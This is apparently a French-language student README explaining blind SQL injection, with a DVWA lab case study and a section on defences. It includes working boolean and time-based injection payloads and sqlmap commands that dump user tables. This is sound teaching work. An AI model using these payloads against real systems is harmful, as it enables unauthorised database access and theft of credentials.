<div align="center">

![Header](https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,100:00f2ff&height=120&section=header&text=&fontSize=0)

</div>

# 💉 Blind SQL Injection — Analyse & Exploitation

<div align="center">

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white) ![SQL](https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white) ![OWASP](https://img.shields.io/badge/OWASP_A03-Critical-red?style=for-the-badge) ![SQLMap](https://img.shields.io/badge/SQLMap-CC0000?style=for-the-badge&logo=linux&logoColor=white) ![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=for-the-badge&logo=burpsuite&logoColor=white)

![Efrei](https://img.shields.io/badge/Efrei_Bordeaux-Mastère_Cybersécurité-purple?style=flat-square) ![Type](https://img.shields.io/badge/Type-Web_Security_Research-orange?style=flat-square) ![Status](https://img.shields.io/badge/Status-Terminé-success?style=flat-square)

> ⚠️ **Avertissement légal** : Ce projet est réalisé dans un environnement de laboratoire contrôlé à des fins strictement pédagogiques.

</div>

---

## 📖 Introduction

L'**injection SQL aveugle (Blind SQL Injection)** est une variante critique de l'injection SQL où l'attaquant ne reçoit pas de retour direct des données extraites — il doit inférer les informations à partir des comportements de l'application.

Cette étude couvre deux techniques principales :
- **Boolean-based Blind** : exploitation via des conditions vraies/fausses
- **Time-based Blind** : exploitation via des délais de réponse

---

## ⚙️ Fonctionnement de l'Attaque

### Boolean-based Blind SQL Injection

Le principe repose sur l'envoi de requêtes dont le résultat booléen (vrai/faux) est observable dans la réponse de l'application.

```sql
-- Test de base : si TRUE, la page s'affiche normalement
' AND 1=1 --

-- Si FALSE, comportement différent (page vide, erreur)
' AND 1=2 --

-- Extraction du nom de la base de données caractère par caractère
' AND SUBSTRING(database(),1,1)='a' --
```

### Time-based Blind SQL Injection

Utilise des fonctions de délai pour inférer des informations sans retour visuel.

```sql
-- Si la condition est vraie, délai de 5 secondes
' AND IF(1=1, SLEEP(5), 0) --

-- Extraction du premier caractère du nom d'utilisateur
' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0) --
```

---

## 🛠️ Exploitation et Exfiltration

### Avec SQLMap (automatisé)

```bash
# Détection automatique des injections
sqlmap -u "http://target.com/page?id=1" --dbs

# Extraction des tables d'une base
sqlmap -u "http://target.com/page?id=1" -D dvwa --tables

# Exfiltration des données
sqlmap -u "http://target.com/page?id=1" -D dvwa -T users --dump
```

### Avec Burp Suite (manuel)

Utilisation de l'Intruder pour automatiser les tests de caractères et reconstruire les données extraites bit par bit.

---

## 📊 Étude de Cas — DVWA (Damn Vulnerable Web Application)

| Niveau DVWA | Technique | Résultat |
| :--- | :--- | :--- |
| **Low** | Boolean + Time-based | Extraction complète (users, passwords) |
| **Medium** | Requêtes POST paramétrées | Contournement via Burp Suite Intercept |
| **High** | Tokens CSRF + limites | Exploitation via script Python automatisé |

---

## 🛡️ Méthodes de Protection

| Mesure | Description |
| :--- | :--- |
| **Requêtes préparées** | `PDO::prepare()` — séparation code/données |
| **ORM sécurisés** | Eloquent, Doctrine — abstraction de la base |
| **WAF** | ModSecurity — filtrage des payloads SQL |
| **Moindre privilège** | Compte DB en lecture seule si possible |
| **Logs & monitoring** | Détection des patterns d'injection |

---

## 🏁 Conclusion

L'injection SQL aveugle reste l'une des vulnérabilités les plus critiques (OWASP A03:2021). Bien que plus lente à exploiter que les injections classiques, elle est tout aussi dangereuse et souvent présente dans des applications jugées "protégées" car elles n'affichent pas d'erreurs SQL.

---

<div align="center">

[![Portfolio](https://img.shields.io/badge/Portfolio-00f2ff?style=for-the-badge&logo=firefox&logoColor=black)](https://kim-san04.github.io) [![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/hakim-sawadogo) [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kim-San04)

![Footer](https://capsule-render.vercel.app/api?type=waving&color=0:00f2ff,100:0d1117&height=80&section=footer)

</div>
